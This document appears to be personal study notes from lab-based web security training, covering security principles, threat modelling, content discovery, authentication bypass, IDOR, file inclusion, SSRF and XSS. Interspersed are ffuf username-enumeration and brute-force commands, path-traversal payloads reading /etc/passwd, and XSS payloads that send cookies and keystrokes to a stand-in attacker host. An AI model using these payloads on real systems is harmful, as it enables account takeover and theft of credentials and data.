<h1>Principles of Security</h1>
<h2>CIA TRIAD</h2>

CIA Triad: Confidentiality, availability, integrity.

Confidentiality: This element is the protection of data from unauthorized access and misuse.

Integrity: This element is the condition where information is kept accurate and consistent unless authorized changes are made.

Availability: In order for data to be useful, it must be available and accessible by the user.

<h2>Principles of Privileges</h2>

PIM: Privileged Identity Management 
PAM: Privileged Access Management

<h2>Security Models Continued</h2>

>The Bell-La Padula Model

![Pasted image 20230425144513](https://user-images.githubusercontent.com/47869173/234837080-7fc993f8-cd02-40ee-8b7f-50e9c3e3ce58.png)


The Bell-La Padula Model is popular within organisations such as governmental and military.

>Biba Model

![Pasted image 20230425144712](https://user-images.githubusercontent.com/47869173/234837107-cc4236a5-7a45-4266-bb02-ba97bdc6ce56.png)

The Biba model is used in organisations or situations where integrity is more important than confidentiality. For example, in software development.

<h2>Threat Modelling & Incident Response </h2>
Thread Modelling is the process of reviewing, improving and testing the security protocols in place in an organisation's information technology infrastructure and services.

The thread modelling process is very similar to a risk assessment made in workplaces for employees and customers. The principles all return to:
+ Preparation
+ Identification
+ Mitigations
+ Review

It is, however, a complex process that needs constant review and discussion with a dedicated team. An effective threat model includes:
+ Threat Intelligence
+ Asset Identification
+ Mitigation Capabilities
+ Risk Assessment


<h3>Frameworks</h3>

+ STRIDE: (Spoofing identity, Tampering with data, Repudiation Threats, Information Disclosure, Denial of Service and Elevation of privileges).
+ PASTA: (Process for Attack Simulation and Threat Analysis).

<h3>Principles and Descriptions</h3>
<a>Spoofing</a>: This principle requires you to authenticate requests and users accessing a system. Spoofing involves a malicious party falsely identifying itself as another. Access keys (such as API keys) or signatures via encryption helps remediate this threat.

<a>Tampering</a>: By providing anti-tampering measures to a system or application, you help provide integrity to the data. Data that is accessed must be kept integral and accurate. For example, shops use seals on food products

<a>Repudiation</a>: This principle dictates the use of services such as logging of activity for a system of application to track

<a>Information Disclosure</a>: Applications or services that handle information of multiple users need to be appropriately configured to only show information relevant to the owner is shown.

<a>Denial of Service</a>: Applications and services use up system resources, these two things should have measures in place so that abuse of application/service won't result in bringing the whole system down.

<a>Elevation of Privilege</a>: This is the worst-case scenario for an application or service. It means that a user was able to escalate their authorization to that of a higher level i.e. an administrator. This scenario often leads to further exploitation or information disclosure

IR: Incident Response
>An IR is responded by a Computer Security Incident Response Team (CSIRT)

![Pasted image 20230425160352](https://user-images.githubusercontent.com/47869173/234837183-32af2a00-9d26-482c-8ebb-5e89979fd9e3.png)

<a>Preparation</a>:	 Do we have the resources and plans in place to deal with the security incident?

<a>Identification</a>: Has the threat and the threat actor been correctly identified in order for us to respond to?

<a>Containment</a>: Can the threat/security incident be contained to prevent other systems or users from being impacted?

<a>Eradication</a>:	Remove the active threat.

<a>Recovery</a>: Perform a full review of the impacted systems to return to business as usual operations.

<a>Lessons Learned</a>:	What can be learnt from the incident? I.e. if it was due to a phishing email, employees should be trained better to detect phishing emails.

<h1>Walking An Application</h1>
<h2>Exploring The Website & Viewing the Page Source</h2>

```
200      GET        1l        5w       33c http://10.10.190.85/staff-portal
404      GET       48l      131w     2204c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://10.10.190.85/private => http://10.10.190.85/private/
301      GET        7l       12w      178c http://10.10.190.85/assets => http://10.10.190.85/assets/
200      GET       13l       21w      408c http://10.10.190.85/assets/site.js
302      GET        0l        0w        0c http://10.10.190.85/customers => http://10.10.190.85/customers/login
200      GET       65l      175w     3108c http://10.10.190.85/contact
200      GET       51l      152w     2538c http://10.10.190.85/news
200      GET       50l       76w     6415c http://10.10.190.85/assets/style.css
200      GET        1l       15w     2409c http://10.10.190.85/assets/flash.min.js
200      GET        4l       11w      232c http://10.10.190.85/tmp.zip
302      GET        0l        0w        0c http://10.10.190.85/news/article => http://10.10.190.85/news
200      GET        1l        1w       34c http://10.10.190.85/assets/flag.txt
200      GET        7l      432w    37049c http://10.10.190.85/assets/bootstrap.min.js
200      GET       62l      345w    25153c http://10.10.190.85/assets/avatars/5.png
200      GET       51l      346w    23758c http://10.10.190.85/assets/avatars/6.png
200      GET       65l      331w    26359c http://10.10.190.85/assets/avatars/2.png
200      GET       45l      301w    24673c http://10.10.190.85/assets/avatars/3.png
200      GET       50l      317w    23450c http://10.10.190.85/assets/avatars/4.png
200      GET       58l      382w    27493c http://10.10.190.85/assets/avatars/1.png
200      GET        2l     1297w    89476c http://10.10.190.85/assets/jquery.min.js
200      GET        6l     1429w   121200c http://10.10.190.85/assets/bootstrap.min.css
200      GET      500l     3428w   281121c http://10.10.190.85/assets/printer.png
200      GET      908l     5294w   418169c http://10.10.190.85/assets/shakinghands.png
200      GET     2169l    13509w   951299c http://10.10.190.85/assets/staff.png
200      GET       43l       46w     1383c http://10.10.190.85/sitemap_xml
200      GET        1l        4w       28c http://10.10.190.85/monthly
200      GET        1l        3w       13c http://10.10.190.85/cookie-test
[####################] - 44s    60032/60032   0s      found:27      errors:0      
[####################] - 43s    30000/30000   699/s   http://10.10.190.85/ 
[####################] - 42s    30000/30000   709/s   http://10.10.190.85/private/ 
[####################] - 3s     30000/30000   11334/s http://10.10.190.85/assets/ => Directory listing
[####################] - 0s     30000/30000   97720/s http://10.10.190.85/assets/avatars/ => Directory listing
```
We found all flags.

<h2>Developer Tools - Inspector</h2>

![Pasted image 20230425162603](https://user-images.githubusercontent.com/47869173/234837253-dd86106f-02e6-48b5-95bb-1aea55c92f33.png)

<h2>Developer Tools - Debugger</h2>

![Pasted image 20230425163638](https://user-images.githubusercontent.com/47869173/234837352-2a201345-7d76-4aac-af27-6192044e4988.png)

Debugging JavaScript.


<h2> Developer Tools - Network</h2>

![Pasted image 20230425164116](https://user-images.githubusercontent.com/47869173/234837398-daf2f972-496f-4194-b238-1eae7f46663d.png)
![Pasted image 20230425164127](https://user-images.githubusercontent.com/47869173/234837420-86345e11-7a0f-404a-942e-ca9cdc4d5a74.png)


<h1>Content Discovery</h1>
<h2>What is Content Discovery?</h2>
There are three main ways of discovering content on a website: manually, automated and OSINT

<h2>Manual Discovery - Robots.txt</h2>


![Pasted image 20230425165512](https://user-images.githubusercontent.com/47869173/234837459-a5a4e9d4-96d4-4093-8244-b40abb0b4ff6.png)

<h2>Manual Discovery - Favicon</h2>

![Pasted image 20230425165950](https://user-images.githubusercontent.com/47869173/234837526-e1af5208-54cf-43fc-bc47-7ca4e781996e.png)

<h2>Manual Discovery - Sitemap.xml</h2>

![Pasted image 20230425170102](https://user-images.githubusercontent.com/47869173/234837548-e8209ff5-351a-4291-bcad-b744bda64b9f.png)

<h2>Manual Discovery - HTTP Headers</h2>

![Pasted image 20230425170422](https://user-images.githubusercontent.com/47869173/234837576-5f7837cd-68b0-4b66-9fba-caa934c66233.png)


<h1>Authentication Bypass</h1>
<h2>Username Enumeration</h2>

```ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.135.23/customers/signup -mr "username already exists"```

+ -w -> wordlist
+ -X -> method
+ -d -> argument that specifies the data that we are going to send
+ -H -> header
+ -u -> URL
+ -mr -> argument is the text on the page we are looking to validate the username
![Pasted image 20230425184957](https://user-images.githubusercontent.com/47869173/234837763-c1c0d0ce-f095-4da0-a1a8-ca70555d1362.png)

<h2>Brute Force</h2>

```ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.135.23/customers/login -fc 200```

-fc -> argument to check for an HTTP status code other than 200

<h2>Logic Flaw</h2>

<h3>What is a Logic Flaw?</h3>

+ Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website.
![Pasted image 20230425190655](https://user-images.githubusercontent.com/47869173/234837917-7d95e00c-79a4-4be8-9522-31fa7f13f27f.png)


<h3>Logic Flaw Example</h3>
The below mock code example checks to see whether the start of the path the client is visiting begins with /admin and if so, then further checks are made to see whether the client is, in fact, an admin. If the page doesn't begin with /admin, the page is shown to the client.

````
if(url.substr(0,6) === '/admin') {
	#code to check user is an admin
} else {
	#View Page
}
````

The PHP code uses three equals signs, it's looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting /adMin will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks.

<h1>IDOR</h1>
<h2>What is an IDOR?</h2>

+ IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.
+ This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.

<h1>File Inclusion</h1>
<h2>Introduction</h2>
<h3>What is File Inclusion?</h3>

![Pasted image 20230425235649](https://user-images.githubusercontent.com/47869173/234838103-d7f783aa-dd50-4c85-9608-3c0d347d4e7e.png)

Let's discuss a scenario where a user requests to access files from a webserver. First, the user sends an HTTP request to the webserver that includes a file to display. For example, if a user wants to access and display their CV within the web application, the request may look as follows, http://webapp.thm/get.php?file=userCV.pdf, where the file is the parameter and the userCV.pdf, is the required file to access.ï»¿

![Pasted image 20230426000251](https://user-images.githubusercontent.com/47869173/234838134-16e7e56b-6a35-4059-8b9d-4f204201095c.png)

<h3>Why do File Inclusion vulnerabilities happen?</h3>
File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and implemented. The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them.

>When the input is not validated, the user can pass any input to the function, causing the vulnerability.

<h3>What is the risk of File Inclusion?</h3>
An attacker can leverage file inclusion to leak data, such as code, credentials or other important files. If the attacker can write files directly to the server, file inclusion might be used to gain remote command execution (RCE).


<h2>Path Traversal</h2>

<h3>Path Traversal</h3>
Also known as Directory Traversal, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application.
The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.

![Pasted image 20230427103228](https://user-images.githubusercontent.com/47869173/234838171-d9ed6786-34cd-4927-88dd-2a20cb93b2fa.png)

<h2>Local File Inclusion - LFI</h2>

<h3>Local File Inclusion (LFI)</h3>
LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as include, require, include_once, and require_once often contribute to a vulnerable web application.

<h2>Local File Inclusion - Bypasses</h2>

Using null bytes: ../../../../../etc/passwd%00

Using the intended directory: directory/../../../../../etc/passwd

Empty String: ....//....//....//....//....//etc/passwd

<h2>Remote File Inclusion - RFI</h2>

The risk of RFI is higher than LFI, since RFI allows attackers to gain RCE on the server. Other consequences of a successful RFI attack include:

+ Sensitive Information Disclosure
+ Cross-site Scripting (XSS)
+ Denial of Service (DOS)

![image](https://user-images.githubusercontent.com/47869173/235557036-bf16a3e0-58f3-4c09-b3fc-51db86532335.png)

<h1>SSRF</h1>
<h2>What is an SSRF?</h2>
SSRF stands for Server-Side Request Forgery. It's a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the source of the attacker's choosing.

<h3>Types of SSRF</h3>
There are two types of SSRF vulnerability; the first is a regular SSRF where data is returned to the attacker's screen. The second is a Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker's screen.

<h3>What's the impact?</h3>
A successful SSRF attack can result in any of the following:
+ Access to unauthorised areas.
+ Access to customer/organisational data.
+ Ability to Scale to internal networks.
+ Reveal authentication tokens/credentials.

<h2>Finding an SSRF</h2>

Potential SSRF vulnerabilities can be spotted in web applications in many different ways. Here is an example of four common places to look:

+ When a full URL is used in a parameter in the address bar:
 
 ![image](https://user-images.githubusercontent.com/47869173/235557085-4b17033a-fe15-47f3-b05d-3ce135c9ddf6.png)

+ A hidden field in a form:
 
![image](https://user-images.githubusercontent.com/47869173/235557116-2ee411b8-14e1-4176-9663-320d4dab60a8.png)

+ A partial URL such as just the hostname:
 
![image](https://user-images.githubusercontent.com/47869173/235557135-02efafa2-00ac-4d1d-82b8-f00cf9e12230.png)

+ Or perhaps only the path of the URL:

![image](https://user-images.githubusercontent.com/47869173/235557160-9a6b5906-0a12-418e-8526-ecef9fbde654.png)


<h2>Defeating Common SSRF Defences</h2>

<h3>Deny List</h3>

+ A Deny List blocks specific resources in a web application, protecting sensitive information like endpoints, IP addresses, and domains. However, attackers can bypass it by using alternative references to blocked resources, like localhost. In cloud environments, it's recommended to block access to the IP address 169.254.169.254, which contains sensitive information about the deployed cloud server. Attackers can bypass this by registering a subdomain that points to the same IP address.

<h3>Allow List</h3>

+ An allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with https://website.thm. An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.

<h3>Open Redirect</h3>

+ If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.

<h1>Cross-Site Scripting (XSS)</h1>

<h2>XSS Payloads</h2>

<h3>What is a payload?</h3>

+ In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.

<h3>Proof of Concept:</h3>

This is the simplest of the payloads where all you want to do is demonstrate that you can achieve XSS on a website.

+ <script>alert('XSS');</script>

<h3>Session Stealing</h3>

+ <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

<h3>Key Logger</h3>

+ <script>document.onkeypress = function(e) {fetch('https://hacker.thm/log?key=' + btoa(e.key));}</script>

<h3>Business Logic</h3>

+ <script>user.changeEmail('attacker@hacker.thm');</script>






